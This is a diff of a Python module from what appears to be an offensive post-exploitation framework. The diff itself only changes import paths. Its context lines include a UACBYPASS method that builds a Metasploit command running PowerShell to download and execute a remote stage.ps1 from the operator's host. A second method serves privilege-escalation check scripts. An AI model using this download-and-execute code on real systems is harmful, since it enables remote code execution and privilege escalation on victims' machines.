@@ -1,6 +1,6 @@
 import base64
 import re
-from main import *
+from lib.main import *
 
 class EXTRAS(object):
     def __init__(self,shellcode):
@@ -22,7 +22,7 @@ class EXTRAS(object):
             return self.shellcode
 
     def UACBYPASS(self, version):
-        from menu import returnIP
+        from lib.menu import returnIP
         randomPort = FUNCTIONS().randomUnusedPort()
         uacbypassrcfilecontents = """run post/windows/manage/exec_powershell SCRIPT="IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/stage.ps1')" SESSION=1"""% (returnIP(), randomPort)
         moduleport = FUNCTIONS().randomUnusedPort()
@@ -45,7 +45,7 @@ class EXTRAS(object):
             return self.shellcode
 
     def ALLCHECKS(self):
-        from menu import returnIP
+        from lib.menu import returnIP
         moduleport = FUNCTIONS().randomUnusedPort()
         FUNCTIONS().DoServe(returnIP(), "", "./externalmodules", port = moduleport, printIt = False)
         with open('allchecks.ps1', 'w') as allchecksfile:
